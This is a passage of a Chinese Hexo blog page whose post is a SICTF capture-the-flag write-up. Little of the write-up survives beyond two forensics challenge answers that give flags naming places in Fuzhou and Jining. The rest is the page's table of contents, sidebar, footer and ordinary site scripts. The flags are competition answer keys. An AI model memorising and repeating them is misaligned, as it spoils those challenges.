+<p>SICTF 福建省福州市仓山区烟台山公园}</p>
+<h3 id="宝塔镇河妖"><a class="markdownIt-Anchor" href="#宝塔镇河妖">#</a> 宝塔镇河妖</h3>
+<p>SICTF 山东省济宁市汶上县太子灵踪塔}</p>
+
+      <div class="tags">
+          <a href="/tags/wp/" rel="tag"><i class="ic i-tag"></i> wp</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-09-11 08:06:31" itemprop="dateModified" datetime="2023-09-11T08:06:31+08:00">2023-09-11</time>
+  </span>
+  <span id="2023/09/10/sictf-wp/" class="item leancloud_visitors" data-flag-title="sictf_wp" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>yhuanhuan <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/09/10/sictf-wp/" title="sictf_wp">http://example.com/2023/09/10/sictf-wp/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/08/24/web-new/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;04&#x2F;wD8Kc2Y5Iu4mEk1.png" title="web_new">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> wp</span>
+  <h3>web_new</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">1.</span> <span class="toc-text"> MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0welcome"><span class="toc-number">1.0.1.</span> <span class="toc-text"> 签到] Welcome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pixel_art"><span class="toc-number">1.0.2.</span> <span class="toc-text"> Pixel_art</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_zip"><span class="toc-number">1.0.3.</span> <span class="toc-text"> baby_zip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_shark"><span class="toc-number">1.0.4.</span> <span class="toc-text"> Easy_Shark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fast_morse"><span class="toc-number">1.0.5.</span> <span class="toc-text"> fast_morse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qr_qr_qr"><span class="toc-number">1.0.6.</span> <span class="toc-text"> QR_QR_QR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">1.0.7.</span> <span class="toc-text"> 问卷调查</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text"> WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0include"><span class="toc-number">2.0.1.</span> <span class="toc-text"> [签到] Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby_php"><span class="toc-number">2.0.2.</span> <span class="toc-text"> Baby_PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">2.0.3.</span> <span class="toc-text"> RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%85%A8%E9%83%BD%E8%A6%81"><span class="toc-number">2.0.4.</span> <span class="toc-text"> 我全都要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E8%B7%9F%E5%BE%97%E4%B8%8A%E6%88%91%E7%9A%84speed%E5%90%97"><span class="toc-number">2.0.5.</span> <span class="toc-text"> 你能跟得上我的 speed 吗</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">3.</span> <span class="toc-text"> Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0pyc"><span class="toc-number">3.0.1.</span> <span class="toc-text"> [签到] PYC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#myobject"><span class="toc-number">3.0.2.</span> <span class="toc-text"> Myobject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chbase"><span class="toc-number">3.0.3.</span> <span class="toc-text"> chbase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84base64"><span class="toc-number">3.0.4.</span> <span class="toc-text"> 不一样的 base64</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">4.</span> <span class="toc-text"> Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0shop"><span class="toc-number">4.0.1.</span> <span class="toc-text"> [签到] Shop</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">5.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">5.0.1.</span> <span class="toc-text"> 古典大杂烩</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#radio"><span class="toc-number">5.0.2.</span> <span class="toc-text"> Radio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy_coppersmith"><span class="toc-number">5.0.3.</span> <span class="toc-text"> Easy_CopperSmith</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mingtianpao"><span class="toc-number">5.0.4.</span> <span class="toc-text"> MingTianPao</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#small_e"><span class="toc-number">5.0.5.</span> <span class="toc-text"> small_e</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98%E6%9D%A5%E5%92%AF"><span class="toc-number">5.0.6.</span> <span class="toc-text"> 签到题来咯！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#forensics"><span class="toc-number">6.</span> <span class="toc-text"> Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AD%E7%89%A9%E4%B9%8B%E6%97%85"><span class="toc-number">6.0.1.</span> <span class="toc-text"> 购物之旅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BE%8E%E5%A5%B3%E5%A7%90%E5%A7%90"><span class="toc-number">6.0.2.</span> <span class="toc-text"> 美女姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E9%95%87%E6%B2%B3%E5%A6%96"><span class="toc-number">6.0.3.</span> <span class="toc-text"> 宝塔镇河妖</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/08/13/Nep-wp/" rel="bookmark" title="Nep__wp">Nep__wp</a></li><li class="active"><a href="/2023/09/10/sictf-wp/" rel="bookmark" title="sictf_wp">sictf_wp</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="yhuanhuan"
+      data-src="/images/huanhuan.png">
+  <p class="name" itemprop="name">yhuanhuan</p>
+  <div class="description" itemprop="description">欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">11</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">7</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">13</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lodWFuaHVhbjAx" title="https:&#x2F;&#x2F;github.com&#x2F;yhuanhuan01"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E7%9F%A5%E8%AF%86/" title="分类于 知识">知识</a>
+</div>
+
+    <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/09/10/sictf-wp/" title="sictf_wp">sictf_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+</div>
+
+    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/08/13/Nep-wp/" title="Nep__wp">Nep__wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="国赛复现">国赛复现</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yhuanhuan @ yhuanhuan</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">74k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:07</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/09/10/sictf-wp/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"bottom","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
